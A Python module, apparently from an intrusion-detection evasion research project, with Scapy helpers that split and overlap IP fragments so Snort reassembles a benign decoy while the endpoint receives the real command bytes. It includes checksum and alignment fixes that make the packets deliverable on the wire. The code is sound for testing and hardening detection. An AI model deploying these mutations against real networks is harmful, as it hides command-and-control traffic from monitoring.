#!/usr/bin/env python3
"""Ambiguity-based mutations: make Snort and the endpoint disagree.

The previous action space was destroy-based (DROP, CORRUPT). Measured
consequence: the policy evaded 96.9% of real Snort by deleting the
payload-bearing packets (372 of 384 actions were DROP), which is not evasion.

These helpers instead keep every original byte on the wire while changing which
bytes a `policy first` reassembler believes:
  * `split_fragments`   -- cut one payload into two non-overlapping IP fragments
  * `overlap_fragments` -- plus an overlapping fragment that carries the real
    first bytes again, arriving AFTER a benign decoy at the same offset

Under `policy first` (Snort's configured behaviour) the benign decoy wins; under
`policy last` (common endpoint behaviour) the real bytes win. Both are measured
by the Phase 2 probe, not assumed.
"""
from __future__ import annotations

from typing import List, Sequence

from c2_semantics import Fragment

FRAG_UNIT = 8


def _check_split(split_at: int) -> None:
    if split_at <= 0:
        raise ValueError(f"split_at must be positive, got {split_at}")
    if split_at % FRAG_UNIT:
        raise ValueError(
            f"split_at must be a multiple of {FRAG_UNIT} (IP fragment offsets are "
            f"in 8-byte units), got {split_at}")


def split_fragments(payload: bytes, split_at: int = 8) -> List[Fragment]:
    """Two non-overlapping fragments. Reassembles to `payload` under any policy."""
    _check_split(split_at)
    if split_at >= len(payload):
        raise ValueError(
            f"split_at {split_at} >= payload length {len(payload)}; nothing to split")
    return [Fragment(offset=0, data=payload[:split_at]),
            Fragment(offset=split_at, data=payload[split_at:])]


def overlap_fragments(payload: bytes, split_at: int = 8,
                      decoy: bytes | None = None) -> List[Fragment]:
    """Three fragments: benign decoy first, real bytes overlapping later.

    Arrival order matters and is the whole mechanism:
      1. offset 0, decoy bytes        (MF set)
      2. offset split_at, real tail   (last fragment)
      3. offset 0, REAL first bytes   (MF set)  <- overlaps #1, arrives later

    `assemble(policy="first")` keeps #1 -> Snort sees the decoy.
    `assemble(policy="last")`  keeps #3 -> the endpoint sees the real command.
    """
    _check_split(split_at)
    if split_at >= len(payload):
        raise ValueError(f"split_at {split_at} >= payload length {len(payload)}")
    if decoy is None:
        decoy = b"\x00" * split_at
    if len(decoy) != split_at:
        raise ValueError(
            f"decoy must be exactly split_at={split_at} bytes, got {len(decoy)}")
    return [Fragment(offset=0, data=decoy),
            Fragment(offset=split_at, data=payload[split_at:]),
            Fragment(offset=0, data=payload[:split_at])]


def reorder_fragments(frags: Sequence[Fragment],
                      order: Sequence[int]) -> List[Fragment]:
    """Present the same fragments in a different arrival order."""
    if sorted(order) != list(range(len(frags))):
        raise ValueError(f"order must be a permutation of 0..{len(frags)-1}")
    return [frags[i] for i in order]


def fragment_plan_to_packets(packets: Sequence, frags: Sequence[Fragment],
                             target_idx: int):
    """Turn a Fragment plan into REAL, wire-deliverable IP fragments.

    Hai tính chất mà bản cũ vi phạm (bắt bởi tests/test_wire_deliverability.py):

    1. Link layer: mỗi fragment được bọc lại bằng CHÍNH link header của packet
       mục tiêu (Ether trên corpus) -> pcap giữ một linktype đồng nhất, NIC
       endpoint nhận được frame (bản cũ emit record trần IP trên linktype
       Ethernet -> libpcap/Snort báo "Inconsistent linktypes").
    2. Địa chỉ: offset tính trong không gian IP payload -- transport header
       CHỈ nằm trên fragment offset-0, `proto` được giữ trên MỌI fragment
       (bản cũ để proto=0 cho TCP), và mỗi điểm cắt rơi đúng ranh giới
       8-byte. Khi TH làm điểm cắt yêu cầu không aligned (TCP TH=20:
       split8 -> 28 không chia hết 8) thì cắt được re-align XUỐNG ranh giới
       hợp lệ gần nhất (split8 -> 4, split16 -> 12, split24 -> 20); byte được
       DI CHUYỂN giữa các chunk, không bao giờ bịa ra byte mới.

    Raises ValueError khi không tồn tại hình học hợp lệ (mã overlap cần TH
    8-aligned: UDP được, TCP 20-byte không được). Caller bắt lỗi và giữ nguyên
    packet gốc -> cơ chế "không áp dụng" thay vì sinh packet rác.
    """
    from scapy.all import IP, Raw, TCP, UDP

    if target_idx < 0 or target_idx >= len(packets):
        raise IndexError(f"target_idx {target_idx} out of range (n={len(packets)})")
    pkt = packets[target_idx]
    if IP not in pkt:
        raise ValueError("target packet has no IP layer to fragment")
    if Raw not in pkt:
        raise ValueError("target packet has no payload to fragment")
    ip = pkt[IP]

    # transport header: chỉ nằm trên fragment offset-0
    th_layer, th_len = None, 0
    th_cls = TCP if TCP in pkt else UDP if UDP in pkt else None
    if th_cls is not None:
        th_layer = pkt[th_cls].copy()
        del th_layer.payload
        if th_layer.chksum is None:
            # Checksum phải tính trên ĐOẠN ĐẦY ĐỦ: frag0 chỉ mang một lát
            # bytes, để chksum=None thì scapy tính lại trên lát ngắn -> endpoint
            # fail checksum sau reassembly. Lấy giá trị từ bản build đầy đủ.
            th_layer.chksum = pkt.__class__(bytes(pkt))[th_cls].chksum
        th_len = len(bytes(th_layer))            # TCP: dataofs*4; UDP: 8
    proto = int(ip.proto) if ip.proto is not None else (
        6 if TCP in pkt else 17 if UDP in pkt else 0)

    # link header: giữ ĐÚNG class của packet mục tiêu (Ether trên corpus)
    outer = None
    if not isinstance(pkt, IP):
        outer = pkt.copy()
        del outer.payload

    n = len(frags)
    idx_sorted = sorted(range(n), key=lambda i: frags[i].offset)
    data = [bytes(frags[i].data) for i in idx_sorted]
    if any(not d for d in data):
        raise ValueError("fragment plan contains an empty chunk")

    dup = len({frags[i].offset for i in idx_sorted}) != n
    ip_off_sorted = []
    if dup:
        # overlap: chunk đến TRƯỚC có offset L7=0 mang TH (IP offset 0); mọi
        # chunk khác bắt đầu tại th_len + offset L7 của nó. RFC 791 buộc các
        # offset đó chia hết 8 -> th_len phải 8-aligned (UDP: 8 ok; TCP
        # 20-byte: không -> caller giữ nguyên packet).
        if th_len % 8:
            raise ValueError(
                f"overlap needs an 8-byte-aligned transport header (th_len={th_len})")
        for j, i in enumerate(idx_sorted):
            off = 0 if j == 0 else th_len + frags[i].offset
            if off % 8:
                raise ValueError(f"overlap cut at IP offset {off} is not 8-aligned")
            ip_off_sorted.append(off)
    else:
        # split liên tục: re-align từng điểm cắt XUỐNG bội 8 gần nhất bằng
        # cách DI CHUYỂN byte giữa 2 chunk kề (thứ tự + tổng byte giữ nguyên).
        cum = 0
        for j in range(n - 1):
            cum += len(data[j])
            delta = (th_len + cum) % 8
            if delta:
                if cum <= delta:
                    raise ValueError(
                        f"no 8-byte-aligned cut near {cum} (th_len={th_len})")
                # giữ cut' = cum - delta (gần điểm cắt yêu cầu nhất vẫn aligned):
                # DI CHUYỂN delta byte từ data[j] sang data[j+1] —
                # TCP th=20: split8->4, split16->12, split24->20.
                data[j], data[j + 1] = data[j][:-delta], data[j][-delta:] + data[j + 1]
                cum -= delta
        acc = 0
        for j, d in enumerate(data):
            ip_off_sorted.append(acc)
            acc += (th_len + len(d)) if j == 0 else len(d)

    # ánh xạ về thứ tự ĐẾN (arrival order) — pcap phải giữ đúng thứ tự gói
    ip_off = [0] * n
    data_orig = [None] * n
    for pos, orig_i in enumerate(idx_sorted):
        ip_off[orig_i] = ip_off_sorted[pos]
        data_orig[orig_i] = data[pos]
    if any(o % 8 for o in ip_off):
        raise ValueError(f"unaligned fragment offsets {ip_off}")

    # fragment cuối tại offset lớn nhất (đến sau cùng) bỏ cờ MF = hết datagram
    max_off = max(ip_off)
    terminator = max(i for i in range(n) if ip_off[i] == max_off)

    out = []
    for i in range(n):
        fip = IP(src=ip.src, dst=ip.dst, id=ip.id, ttl=ip.ttl, proto=proto,
                 frag=ip_off[i] // 8,
                 flags="MF" if i != terminator else 0)
        seg = outer.copy() / fip if outer is not None else fip
        if ip_off[i] == 0 and th_layer is not None:
            seg = seg / th_layer.copy()
        seg = seg / Raw(load=data_orig[i])
        out.append(seg)
    return out


def fix_checksums(pkt, new_payload: bytes):
    """Return a copy of pkt carrying new_payload with refreshed checksums.

    Snort silently discards packets whose IP/UDP/TCP checksum is wrong, so a
    payload rewrite that skipped this would make every mechanism "evade" for
    the wrong reason.  The input packet is never mutated.
    """
    from scapy.all import IP, Raw, TCP, UDP

    out = pkt.copy()
    # Rebuild from the packet's OWN link-layer class: a corpus packet is
    # Ether/IP/TCP, and re-parsing as IP() would silently drop the Ethernet
    # header, producing a frame Snort never sees as intended.
    link = pkt.__class__
    # Replace the WHOLE payload stack below the transport header.  Editing
    # only Raw.load leaves a pre-existing Padding layer in place, and the
    # rebuilt bytes then re-parse into Padding + a truncated Raw tail.
    for cls in (TCP, UDP):
        if cls in out:
            del out[cls].payload
            out = out / Raw(load=new_payload)
            break
    else:
        out = out / Raw(load=new_payload)
    if UDP in out:
        del out[UDP].chksum
    if TCP in out:
        del out[TCP].chksum
    if IP in out:
        del out[IP].chksum
        del out[IP].len  # stale total length truncates a grown payload on re-parse
    return link(bytes(out))
